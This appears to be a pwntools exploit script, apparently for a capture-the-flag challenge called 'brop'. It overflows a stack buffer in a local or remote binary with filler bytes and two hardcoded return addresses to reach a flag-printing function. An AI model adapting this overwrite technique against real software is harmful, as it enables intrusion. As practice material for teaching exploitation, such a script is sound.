#!/usr/bin/env python3

import argparse
from pwn import *

TARGET = "./run"
REMOTE = ("brop.challenges.cfd", 5000)

context.log_level = "debug"
context.terminal = ["tmux", "split-window", "-hf"]
context.binary = TARGET

def exploit(r, e):
    # gdb.attach(r)

    WRITE = 0x401196
    FLAG = 0x4011a7

    r.sendline(8 * b"A" + 8 * b"B" + p64(WRITE) + p64(FLAG))

    r.interactive()

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("-r", "--remote", action="store_true", dest="remote",
                        help="Run exploit on the remote target.")
    args = parser.parse_args()

    if args.remote:
        r = remote(*REMOTE)
    else:
        r = process(TARGET)

    e = ELF(TARGET)
    exploit(r, e)

if __name__ == "__main__":
    main()
